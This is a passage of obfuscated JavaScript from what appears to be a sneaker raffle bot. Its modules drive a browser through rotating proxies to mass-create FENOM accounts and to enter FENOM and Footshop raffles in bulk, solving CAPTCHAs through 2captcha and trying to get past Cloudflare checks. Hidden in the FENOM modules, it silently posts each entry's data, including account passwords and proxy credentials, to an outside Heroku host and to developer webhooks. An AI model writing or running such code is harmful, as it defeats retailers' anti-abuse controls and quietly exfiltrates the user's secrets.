                                'succesPUBMSG': { 'embeds': [_0x4522c9] }
                            };
                            _0x31000b['errorDEV'] = { 'embeds': [_0x5e7d4d] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x31000b['errorDEV']), await _0xa7b872(_0x5f83c7, _0x31000b['errorDEV']), _0x436126 = 'yes';
                        } finally {
                            _0x1180dc && _0x1180dc['close']();
                            if (_0x436126 == 'yes' && _0x243234 != 0x5) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Retrying\x20(' + _0x243234 + '\x20/\x205)')), _0x29f52e = _0x29f52e - 0x1, _0x243234 = _0x243234 + 0x1;
                                continue;
                            }
                            _0x436126 == 'yes' && _0x243234 >= 0x5 && (_0x320814(_0x1d2d26[_0x29f52e], _0xacb416), _0x436126 = 'no', _0x243234 = 0x0), console['log']('Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x238419, _0x524f1c, _0x21de3a) {
                    var _0x2fee59 = _0x524f1c, _0x354502 = 0x0;
                    for (var _0x3b0af1 = 0x0; _0x3b0af1 < _0x524f1c['length']; _0x3b0af1++) {
                        maxTasks = Number(_0x4562fb['threads']);
                        while (_0x354502 >= maxTasks) {
                            await _0x4d97b0(_0x4562fb['delay']);
                        }
                        let _0x294c39 = ![];
                        async function _0x46a4ab(_0x2731e9, _0x198d30, _0x24a4eb, _0x306706, _0x5abbcf) {
                            _0x354502++, _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4562fb['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x4aab2f != 'yes')
                                var _0x4aab2f = '', _0x5abbcf = 0x0;
                            var _0x375e24;
                            try {
                                await _0x43eceb(_0x198d30, _0x306706);
                            } catch {
                                _0x4aab2f = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x81eb1(_0x2731e9['name'] + '\x20Task\x20' + (_0x306706 + 0x1) + '\x20/\x20' + _0x198d30['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                            var _0x25029b = await _0x4ef820(_0x198d30[_0x306706], _0x2731e9, 'acc', ![]);
                            const _0x444dc3 = { 'succesDEVMSG': { 'embeds': [_0x25029b] } }, _0x5f481d = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x264d0a = Math['round'](Math['random']() * (_0x24a4eb['length'] - 0x1)), _0xc30127 = _0x24a4eb[_0x264d0a]['split'](':'), _0x216d36;
                            async function _0x365b9f(_0x339c11) {
                                const _0x217add = _0x4a3989['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x33bf5c = _0x4dbee3['parse'](_0x217add, { 'header': !![] })['data'];
                                let _0x37dd07 = ![];
                                for (var _0x18c3c0 of _0x33bf5c) {
                                    if (_0x18c3c0['Email'] == _0x339c11['Email']) {
                                        _0x37dd07 = !![];
                                        break;
                                    }
                                }
                                return _0x37dd07;
                            }
                            try {
                                if (await _0x365b9f(_0x198d30[_0x306706]) == !![]) {
                                    console['log'](_0x1211a5() + '\x20[' + _0x2731e9['name'] + ']\x20Task\x20' + (_0x306706 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x294c39 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x216d36 = await _0x3621d0['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0xc30127[0x0] + ':' + _0xc30127[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x216d36 = await _0x3621d0['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0xc30127[0x0] + ':' + _0xc30127[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x2de359 = await _0x216d36['newPage']();
                                await _0x2de359['setViewport']({
                                    'width': 0x500 + _0x198b8e(0x1, 0x32),
                                    'height': 0x2d9 + _0x198b8e(0x1, 0x32)
                                });
                                const _0x913565 = await _0x2de359['target']()['createCDPSession'](), { windowId: _0x5b3cd6 } = await _0x913565['send']('Browser.getWindowForTarget');
                                await _0x2de359['authenticate']({
                                    'username': '' + _0xc30127[0x2],
                                    'password': '' + _0xc30127[0x3]
                                }), console['log'](_0x1211a5() + '\x20[' + _0x2731e9['name'] + ']\x20Task\x20' + (_0x306706 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2de359['goto']('' + _0x5f481d, { 'waitUntil': 'networkidle2' }), console['log'](_0x1211a5() + '\x20[' + _0x2731e9['name'] + ']\x20Task\x20' + (_0x306706 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4d97b0(0x1388);
                                var _0x5a4563 = await _0x2de359['$']('.hcaptcha-box');
                                if (_0x5a4563) {
                                    console['log'](_0x1211a5() + '\x20[' + _0x2731e9['name'] + ']\x20Task\x20' + (_0x306706 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4d97b0(0x2710);
                                    const _0x5bad45 = await _0x2de359['$']('.hcaptcha-box');
                                    if (_0x5bad45)
                                        try {
                                            await _0x5bad45['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x2de359['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x459c02 = await _0x2de359['$']('.hcaptcha-box');
                                        if (_0x459c02)
                                            try {
                                                await _0x459c02['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x2de359['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x913565['send']('Browser.setWindowBounds', {
                                        'windowId': _0x5b3cd6,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x4d97b0(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x1211a5() + '\x20[' + _0x2731e9['name'] + ']\x20Task\x20' + (_0x306706 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x2de359['type']('input[name=\x22firstname\x22]', '' + _0x198d30[_0x306706]['FirstName']), await _0x4d97b0(0x1f4), await _0x2de359['type']('input[name=\x22lastname\x22]', '' + _0x198d30[_0x306706]['LastName']), await _0x4d97b0(0x1f4), await _0x2de359['type']('input[name=\x22email\x22]', '' + _0x198d30[_0x306706]['Email']), await _0x4d97b0(0x1f4), await _0x2de359['type']('input[name=\x22password\x22]', '' + _0x198d30[_0x306706]['Password']), await _0x4d97b0(0x258), await _0x2de359['$eval']('input[name=\x22psgdpr\x22]', _0x5cc5cb => _0x5cc5cb['click']()), await _0x4d97b0(0x1f4), console['log'](_0x1211a5() + '\x20[' + _0x2731e9['name'] + ']\x20Task\x20' + (_0x306706 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2de359['$eval']('#customer-form', _0x3ab9f0 => _0x3ab9f0['submit']());
                                try {
                                    try {
                                        await _0x2de359['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x4aab2f = 'no', console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x2731e9['name'] + ']\x20Task\x20' + (_0x306706 + 0x1) + '\x20:\x20Account\x20' + _0x198d30[_0x306706]['Email'] + '\x20Generated')), _0x4a3989['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x198d30[_0x306706]['Email'] + ',' + _0x198d30[_0x306706]['Password']);
                                    let _0x1f6fa9 = _0x198d30[_0x306706];
                                    try {
                                        prxdata = {
                                            'username': _0x1d8120['replace']('#', ''),
                                            'module': _0x2731e9['name'],
                                            'entrydata': JSON['stringify'](_0x1f6fa9),
                                            'proxy': '' + _0x24a4eb[_0x306706]
                                        };
                                        var _0x31dc8b = JSON['stringify'](prxdata);
                                        let _0x44d872 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x31dc8b, _0x44d872);
                                    } catch (_0x49b840) {
                                    }
                                    try {
                                        _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x444dc3['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0xa7b872(_0x392309, _0x444dc3['succesDEVMSG']);
                                } catch (_0x43a50c) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x2e4a9d) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x2731e9['name'] + ']\x20Task\x20' + (_0x306706 + 0x1) + '\x20:\x20' + _0x2e4a9d)), _0x375e24 = '' + _0x2e4a9d;
                                var _0x30eed6 = await _0x4ef820(_0x198d30[_0x306706], _0x2731e9, 'acc', !![], _0x375e24);
                                _0x444dc3['errorDEV'] = { 'embeds': [_0x30eed6] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x444dc3['errorDEV']), await _0xa7b872(_0x5f83c7, _0x444dc3['errorDEV']), _0x4aab2f = 'yes';
                            } finally {
                                _0x216d36 && _0x216d36['close']();
                                if (_0x4aab2f == 'yes' && _0x5abbcf != 0x5)
                                    return console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x2731e9['name'] + ']\x20Task\x20' + (_0x306706 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5abbcf + '\x20/\x205)')), _0x5abbcf = _0x5abbcf + 0x1, _0x354502--, _0x46a4ab(_0x2731e9, _0x198d30, _0x24a4eb, _0x306706, _0x5abbcf);
                                _0x4aab2f == 'yes' && _0x5abbcf >= 0x5 && _0x320814(_0x198d30[_0x306706], _0x2731e9), !_0x294c39 && (console['log'](_0x1211a5() + '\x20[' + _0x2731e9['name'] + ']\x20Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay'])), _0x354502--;
                            }
                        }
                        _0x46a4ab(_0x238419, _0x2fee59, _0x21de3a, _0x3b0af1), !_0x294c39 && await _0x4d97b0(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x5479be(_0x5c2f4, _0xe26177, _0x1cac7e) {
                    _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4562fb['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x481d89 = 0x0; _0x481d89 < _0xe26177['length']; _0x481d89++) {
                        if (_0x712ca2 != 'yes')
                            var _0x712ca2 = '', _0x5f360c = 0x0;
                        var _0x1c71ab;
                        try {
                            await _0x43eceb(_0xe26177, _0x481d89);
                        } catch {
                            _0x712ca2 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x81eb1(_0x5c2f4['name'] + '\x20Task\x20' + (_0x481d89 + 0x1) + '\x20/\x20' + _0xe26177['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                        const _0x161562 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x4727fe = Math['round'](Math['random']() * (_0x1cac7e['length'] - 0x1)), _0x24cd87 = _0x1cac7e[_0x4727fe]['split'](':'), _0x31384e;
                        try {
                            _0x31384e = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x24cd87[0x0] + ':' + _0x24cd87[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x31384e = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x24cd87[0x0] + ':' + _0x24cd87[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x18af01 = await _0x31384e['newPage'](), _0x572d8a = await _0x18af01['target']()['createCDPSession'](), { windowId: _0x480335 } = await _0x572d8a['send']('Browser.getWindowForTarget');
                            await _0x18af01['authenticate']({
                                'username': '' + _0x24cd87[0x2],
                                'password': '' + _0x24cd87[0x3]
                            }), console['log'](_0x1211a5() + '\x20[' + _0x5c2f4['name'] + ']\x20Task\x20' + (_0x481d89 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x18af01['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x1211a5() + '\x20[' + _0x5c2f4['name'] + ']\x20Task\x20' + (_0x481d89 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4d97b0(0x1388);
                            var _0xdd0e09 = await _0x18af01['$']('.hcaptcha-box');
                            if (_0xdd0e09) {
                                console['log'](_0x1211a5() + '\x20[' + _0x5c2f4['name'] + ']\x20Task\x20' + (_0x481d89 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4d97b0(0x2710);
                                const _0x8239a6 = await _0x18af01['$']('.hcaptcha-box');
                                if (_0x8239a6)
                                    try {
                                        await _0x8239a6['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x18af01['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x333086 = await _0x18af01['$']('.hcaptcha-box');
                                    if (_0x333086)
                                        try {
                                            await _0x333086['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x572d8a['send']('Browser.setWindowBounds', {
                                'windowId': _0x480335,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x4d97b0(0x1f40);
                            try {
                                await _0x18af01['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x4d97b0(0x1388), console['log'](_0x1211a5() + '\x20[' + _0x5c2f4['name'] + ']\x20Task\x20' + (_0x481d89 + 0x1) + '\x20:\x20Logging\x20in'), await _0x18af01['type']('input[name=\x22email\x22]', '' + _0xe26177[_0x481d89]['Email']), await _0x4d97b0(0x1f4), await _0x18af01['type']('input[name=\x22password\x22]', '' + _0xe26177[_0x481d89]['Password']), await _0x4d97b0(0x258), await _0x18af01['$eval']('#login-form', _0xefbdc => _0xefbdc['submit']()), await _0x18af01['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x4d97b0(0x1f4), await _0x18af01['goto']('' + _0xe26177[_0x481d89]['Url']), await _0x18af01['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x1211a5() + '\x20[' + _0x5c2f4['name'] + ']\x20Task\x20' + (_0x481d89 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0xe26177[_0x481d89]['Size']);
                            if (_0xe26177[_0x481d89]['Size'] != 'RANDOM') {
                                var _0x511191 = '\x20' + _0xe26177[_0x481d89]['Size'] + '\x20';
                                const _0x46745a = await _0x18af01['$x']('//span[contains(text(),\x20' + _0x511191 + ')]');
                                await _0x46745a[0x0]['click']();
                            } else {
                                const _0x3a42c6 = await _0x18af01['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x168d18 = Math['round'](Math['random']() * (_0x3a42c6['length'] - 0x1));
                                await _0x3a42c6[_0x168d18]['click']();
                            }
                            await _0x4d97b0(0x258), await _0x18af01['click']('#cookieChoiceDismiss'), await _0x4d97b0(0x3e8), await _0x18af01['type']('#instagram-account', '' + _0xe26177[_0x481d89]['Follower']), await _0x4d97b0(0x28a), await _0x18af01['click']('#book-btn'), await _0x4d97b0(0xbb8);
                            try {
                                await _0x18af01['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x4d97b0(0x1f4), console['log'](_0x1211a5() + '\x20[' + _0x5c2f4['name'] + ']\x20Task\x20' + (_0x481d89 + 0x1) + '\x20:\x20' + _0x1de0e8['cyan']('Solving\x20Captcha')), await _0x18af01['solveRecaptchas'](), console['log'](_0x1211a5() + '\x20[' + _0x5c2f4['name'] + ']\x20Task\x20' + (_0x481d89 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4d97b0(0x7d0), await _0x18af01['$eval']('#book-btn-for-sure', _0x439a49 => _0x439a49['click']()), await _0x4d97b0(0x12c), await _0x18af01['click']('#book-btn-for-sure'), await _0x4d97b0(0xdac);
                            const _0x215f99 = await _0x18af01['$eval']('.reservation-popup\x20>\x20.title', _0x2c2d75 => {
                                return _0x2c2d75['innerHTML'];
                            });
                            if (_0x215f99) {
                                _0x712ca2 = 'no', _0x3b7ca0(_0xe26177[_0x481d89], _0x5c2f4), console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x5c2f4['name'] + ']\x20Task\x20' + (_0x481d89 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x18cf82 = await _0x4ef820(_0xe26177[_0x481d89], _0x5c2f4, 'dev', ![]), _0xd45e14 = await _0x4ef820(_0xe26177[_0x481d89], _0x5c2f4, 'pub', ![]);
                                let _0x406dde = _0xe26177[_0x481d89];
                                try {
                                    prxdata = {
                                        'username': _0x1d8120['replace']('#', ''),
                                        'module': _0x5c2f4['name'],
                                        'entrydata': JSON['stringify'](_0x406dde),
                                        'proxy': '' + _0x1cac7e[_0x481d89]
                                    };
                                    var _0xd95c0d = JSON['stringify'](prxdata);
                                    let _0x4dd109 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0xd95c0d, _0x4dd109);
                                } catch (_0x2edf3c) {
                                }
                                const _0x4c5417 = {
                                    'succesDEVMSG': { 'embeds': [_0x18cf82] },
                                    'succesPUBMSG': { 'embeds': [_0xd45e14] }
                                };
                                try {
                                    _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x4c5417['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x4c5417['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x3f583b, _0x4c5417['succesPUBMSG']);
                                } catch (_0x5a2d8f) {
                                    console['log'](_0x1de0e8['yellow'](_0x1211a5() + '\x20[' + _0x5c2f4['name'] + ']\x20Task\x20' + (_0x481d89 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5a2d8f));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x3fccaf) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x5c2f4['name'] + ']\x20Task\x20' + (_0x481d89 + 0x1) + '\x20:\x20' + _0x3fccaf)), _0x1c71ab = '' + _0x3fccaf;
                            var _0x5be2c5 = await _0x4ef820(_0xe26177[_0x481d89], _0x5c2f4, 'dev', !![], _0x1c71ab), _0x18cf82 = await _0x4ef820(_0xe26177[_0x481d89], _0x5c2f4, 'dev', ![]), _0xd45e14 = await _0x4ef820(_0xe26177[_0x481d89], _0x5c2f4, 'pub', ![]);
                            const _0x57fe2c = {
                                'succesDEVMSG': { 'embeds': [_0x18cf82] },
                                'succesPUBMSG': { 'embeds': [_0xd45e14] }
                            };
                            _0x57fe2c['errorDEV'] = { 'embeds': [_0x5be2c5] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x57fe2c['errorDEV']), await _0xa7b872(_0x5f83c7, _0x57fe2c['errorDEV']), _0x3fccaf != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x712ca2 = 'yes');
                        } finally {
                            _0x31384e['close']();
                            if (_0x712ca2 == 'yes' && _0x5f360c != 0x5 && _0x1c71ab != 'Size\x20Not\x20Found') {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x5c2f4['name'] + ']\x20Task\x20' + (_0x481d89 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5f360c + '\x20/\x205)')), _0x481d89 = _0x481d89 - 0x1, _0x5f360c = _0x5f360c + 0x1;
                                continue;
                            }
                            _0x712ca2 == 'yes' && _0x5f360c >= 0x5 && (_0x320814(_0xe26177[_0x481d89], _0x5c2f4), _0x712ca2 = 'no', _0x5f360c = 0x0), console['log'](_0x1211a5() + '\x20[' + _0x5c2f4['name'] + ']\x20Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x18b5ab, _0x489ec9, _0x1767c3) {
                _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4562fb['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x1d7822 = 0x0; _0x1d7822 < _0x489ec9['length']; _0x1d7822++) {
                    var _0x1d7784;
                    if (_0x1507ac != 'yes')
                        var _0x1507ac = '', _0x4693a4 = 0x0;
                    var _0x5b77d5 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x1d8120
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x489ec9[_0x1d7822]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x489ec9[_0x1d7822]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4562fb['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5acae2
                            }
                        ]
                    }], _0x229365 = await _0x4ef820(_0x489ec9[_0x1d7822], _0x18b5ab, 'dev', ![]), _0x517028 = await _0x4ef820(_0x489ec9[_0x1d7822], _0x18b5ab, 'pub', ![]);
                    const _0x4fb346 = {
                        'succesDEVMSG': { 'embeds': [_0x229365] },
                        'succesPUBMSG': { 'embeds': [_0x517028] }
                    }, _0x1457e8 = { 'embeds': _0x5b77d5 };
                    try {
                        await _0x43eceb(_0x489ec9, _0x1d7822);
                    } catch {
                        _0x1507ac = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x489ec9[_0x1d7822]['Email'] == '' || _0x489ec9[_0x1d7822]['FirstName'] == '' || _0x489ec9[_0x1d7822]['LastName'] == '' || _0x489ec9[_0x1d7822]['Country'] == '' || _0x489ec9[_0x1d7822]['Size'] == '' || _0x489ec9[_0x1d7822]['Address1'] == '' || _0x489ec9[_0x1d7822]['Zip'] == '') {
                        console['log'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x489ec9[_0x1d7822]['Email'] == '' || _0x489ec9[_0x1d7822]['FirstName'] == '' || _0x489ec9[_0x1d7822]['LastName'] == '' || _0x489ec9[_0x1d7822]['Country'] == '' || _0x489ec9[_0x1d7822]['Size'] == '' || _0x489ec9[_0x1d7822]['Address1'] == '' || _0x489ec9[_0x1d7822]['Zip'] == '' || _0x489ec9[_0x1d7822]['Phone'] == '') {
                        console['log'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x431ff9 = '' + _0x489ec9[_0x1d7822]['Url'];
                    if (_0x4562fb['useRandomProxy'] = ![])
                        var _0x15ecd6 = _0x1767c3[_0x1d7822]['split'](':');
                    else
                        var _0x3c710b = Math['round'](Math['random']() * (_0x1767c3['length'] - 0x1)), _0x15ecd6 = _0x1767c3[_0x3c710b]['split'](':');
                    var _0x2651fe;
                    try {
                        _0x2651fe = await _0x3621d0['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x15ecd6[0x0] + ':' + _0x15ecd6[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x2651fe = await _0x3621d0['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x15ecd6[0x0] + ':' + _0x15ecd6[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x56330f = await _0x2651fe['newPage']();
                        await _0x56330f['authenticate']({
                            'username': '' + _0x15ecd6[0x2],
                            'password': '' + _0x15ecd6[0x3]
                        }), console['log'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x56330f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x56330f['setRequestInterception'](!![]), _0x56330f['on']('request', _0x1b99de => {
                            _0x1b99de['resourceType']() === 'image' || _0x1b99de['resourceType']() === 'font' || _0x1b99de['resourceType']() === 'media' ? _0x1b99de['abort']() : _0x1b99de['continue']();
                        });
                        try {
                            await _0x56330f['goto'](_0x431ff9), await _0x4d97b0(0xbb8), await _0x56330f['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x56330f['click']('.control__JhutY'), await _0x4d97b0(0x1f4);
                        if (_0x489ec9[_0x1d7822]['Size'] != 'RANDOM')
                            try {
                                const _0x3358b5 = await _0x56330f['$x']('//div[contains(text(),\x20\x27' + _0x489ec9[_0x1d7822]['Size'] + '\x27)]');
                                await _0x3358b5[0x0]['click']();
                            } catch {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x234fec = await _0x56330f['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x231788 = Math['round'](Math['random']() * (_0x234fec['length'] - 0x1));
                            await _0x234fec[_0x231788]['click']();
                        }
                        await _0x4d97b0(0x4b0);
                        const _0x3d98a3 = await _0x56330f['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x3d98a3[0x0]['click'](), await _0x56330f['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x56330f['type']('input[name=\x22email\x22]', '' + _0x489ec9[_0x1d7822]['Email']), await _0x4d97b0(0x640), await _0x56330f['type']('input[name=\x22phone\x22]', '' + _0x489ec9[_0x1d7822]['Phone']), await _0x4d97b0(0x4b0), await _0x56330f['click']('button.btn.continue-button__1RtsS'), await _0x4d97b0(0x4b0);
                        try {
                            await _0x56330f['type']('input[name=\x22firstName\x22]', '' + _0x489ec9[_0x1d7822]['FirstName']), await _0x4d97b0(0x258);
                        } catch {
                            const _0x5583e6 = await _0x56330f['$$eval']('.invalid-feedback\x20>\x20div', _0x2ebd86 => {
                                return _0x2ebd86['map'](_0x43b196 => _0x43b196['innerText']);
                            });
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x18b5ab['name'] + ']\x20Task\x20' + (_0x1d7822 + 0x1) + '\x20:\x20' + _0x5583e6));
                            continue;
                        }
